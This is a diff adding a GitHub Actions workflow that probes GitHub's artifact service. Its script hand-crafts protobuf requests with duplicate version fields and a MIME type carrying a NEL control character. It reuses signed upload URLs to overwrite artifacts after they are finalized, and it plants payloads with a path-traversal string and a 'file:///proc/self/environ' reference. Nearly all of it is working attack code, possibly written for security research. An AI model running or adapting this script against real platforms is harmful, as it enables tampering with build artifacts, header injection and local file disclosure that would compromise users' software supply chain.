@@ -1,0 +1,121 @@
+name: Repo Cassette duplicate protobuf version field probe
+on:
+  workflow_dispatch:
+  push:
+    branches: [probe-protobuf-version-duplicate-nyanfox-20261025]
+    paths: [.github/workflows/probe_protobuf_duplicate_version.yml]
+permissions:
+  actions: read
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Test duplicate protobuf artifact version field ordering
+        uses: actions/github-script@v8
+        env:
+          GH_TOKEN: ${{ github.token }}
+        with:
+          script: |
+            const {createHash} = require('node:crypto');
+            const token = process.env.ACTIONS_RUNTIME_TOKEN;
+            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
+            if (!token || !resultsUrl) throw new Error('Actions runtime artifact credentials unavailable');
+            const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
+            const scope = claims.scp.split(' ').find(value => value.startsWith('Actions.Results:'));
+            if (!scope) throw new Error('Actions.Results scope missing');
+            const [, runBackendId, jobBackendId] = scope.split(':');
+            const endpoint = new URL(resultsUrl).origin + '/twirp/github.actions.results.api.v1.ArtifactService/';
+            const repo = process.env.GITHUB_REPOSITORY;
+            const [owner, repoName] = repo.split('/');
+            const nel = Buffer.from('application/json\u0085');
+            function varint(n) {
+              const out = [];
+              while (n >= 128) { out.push((n & 127) | 128); n = Math.floor(n / 128); }
+              out.push(n);
+              return Buffer.from(out);
+            }
+            function field(number, value) {
+              const data = Buffer.isBuffer(value) ? value : Buffer.from(value);
+              return Buffer.concat([varint(number * 8 + 2), varint(data.length), data]);
+            }
+            function version(value) { return Buffer.concat([varint(5 * 8), varint(value)]); }
+            function mime(value) { return field(6, field(1, value)); }
+            function requestBytes(name, versions, mimes) {
+              return Buffer.concat([field(1, runBackendId), field(2, jobBackendId), field(3, name), ...versions.map(version), ...mimes.map(mime)]);
+            }
+            function readVarint(bytes, pos) {
+              let value = 0, shift = 0, byte;
+              do { byte = bytes[pos++]; value += (byte & 127) * 2 ** shift; shift += 7; } while (byte & 128);
+              return [value, pos];
+            }
+            function signedUploadUrl(bytes) {
+              for (let pos = 0; pos < bytes.length;) {
+                let tag; [tag, pos] = readVarint(bytes, pos);
+                const fieldNo = tag >> 3, wire = tag & 7;
+                if (wire === 0) { [, pos] = readVarint(bytes, pos); continue; }
+                if (wire !== 2) throw new Error(`Unexpected response protobuf wire type ${wire}`);
+                let length; [length, pos] = readVarint(bytes, pos);
+                if (fieldNo === 2) return bytes.subarray(pos, pos + length).toString();
+                pos += length;
+              }
+              return '';
+            }
+            async function rpc(method, body, binary = false) {
+              const response = await fetch(endpoint + method, {method: 'POST', headers: {Authorization: `Bearer ${token}`, 'Content-Type': binary ? 'application/protobuf' : 'application/json'}, body: binary ? body : JSON.stringify(body)});
+              return {status: response.status, type: response.headers.get('content-type'), bytes: Buffer.from(await response.arrayBuffer())};
+            }
+            async function put(url, bytes) {
+              const response = await fetch(url, {method: 'PUT', headers: {'x-ms-blob-type': 'BlockBlob', 'x-ms-version': '2023-11-03', 'Content-Type': 'application/octet-stream'}, body: bytes});
+              return response.status;
+            }
+            async function inspect(id, expected) {
+              const response = await fetch(`https://api.github.com/repos/${owner}/${repoName}/actions/artifacts/${id}/zip`, {headers: {Authorization: `Bearer ${process.env.GH_TOKEN}`, Accept: 'application/vnd.github+json'}, redirect: 'manual'});
+              const location = response.headers.get('location');
+              if (!location) return {apiStatus: response.status};
+              const signed = new URL(location);
+              const downloaded = await fetch(location);
+              const bytes = Buffer.from(await downloaded.arrayBuffer());
+              const type = downloaded.headers.get('content-type') || '';
+              return {apiStatus: response.status, downloadStatus: downloaded.status, rsct: signed.searchParams.get('rsct'), contentType: type, contentTypeHex: Buffer.from(type, 'latin1').toString('hex'), bytes: bytes.length, exact: bytes.equals(expected)};
+            }
+            const cases = [
+              ['v6_then_v7_nel', [6, 7], [nel]],
+              ['v7_then_v6_nel', [7, 6], [nel]],
+              ['v6_then_v7_mime_nel_last', [6, 7], [Buffer.from('application/json'), nel]],
+              ['v7_then_v6_mime_nel_last', [7, 6], [Buffer.from('application/json'), nel]],
+              ['v6_then_v7_mime_safe_last', [6, 7], [nel, Buffer.from('application/json')]],
+              ['v7_then_v6_mime_safe_last', [7, 6], [nel, Buffer.from('application/json')]],
+            ];
+            for (const [label, versions, mimes] of cases) {
+              const name = `${process.env.GITHUB_RUN_ID}-${label}`;
+              const created = await rpc('CreateArtifact', requestBytes(name, versions, mimes), true);
+              if (created.status !== 200) {
+                core.info(`PROTO_VERSION ${JSON.stringify({label, versions, mimeHex: mimes.map(x => x.toString('hex')), status: created.status, responseType: created.type, response: created.bytes.toString('utf8').slice(0, 160)})}`);
+                continue;
+              }
+              const uploadUrl = signedUploadUrl(created.bytes);
+              if (!uploadUrl) {
+                core.info(`PROTO_VERSION ${JSON.stringify({label, versions, status: created.status, error: 'no signed upload URL'})}`);
+                continue;
+              }
+              const placeholder = Buffer.from('{}');
+              const uploadStatus = await put(uploadUrl, placeholder);
+              if (uploadStatus < 200 || uploadStatus >= 300) {
+                core.info(`PROTO_VERSION ${JSON.stringify({label, versions, status: created.status, uploadStatus})}`);
+                continue;
+              }
+              const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
+              const finalized = await rpc('FinalizeArtifact', {workflow_run_backend_id: runBackendId, workflow_job_run_backend_id: jobBackendId, name, size: String(placeholder.length), hash});
+              if (finalized.status !== 200) {
+                core.info(`PROTO_VERSION ${JSON.stringify({label, versions, status: created.status, uploadStatus, finalizeStatus: finalized.status, finalizeBody: finalized.bytes.toString('utf8').slice(0, 120)})}`);
+                continue;
+              }
+              const finalValue = JSON.parse(finalized.bytes.toString('utf8'));
+              const id = String(finalValue.artifact_id || finalValue.artifactId || '');
+              const payload = Buffer.from(JSON.stringify({full_name: `x/../../repos/${repo}/actions/artifacts/${id}/zip`, owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'}, description: label}));
+              const overwrite = await put(uploadUrl, payload);
+              const result = await inspect(id, payload);
+              core.info(`PROTO_VERSION ${JSON.stringify({label, versions, mimeHex: mimes.map(x => x.toString('hex')), status: created.status, uploadStatus, finalizeOk: finalValue.ok, artifactId: id, overwrite, result})}`);
+            }
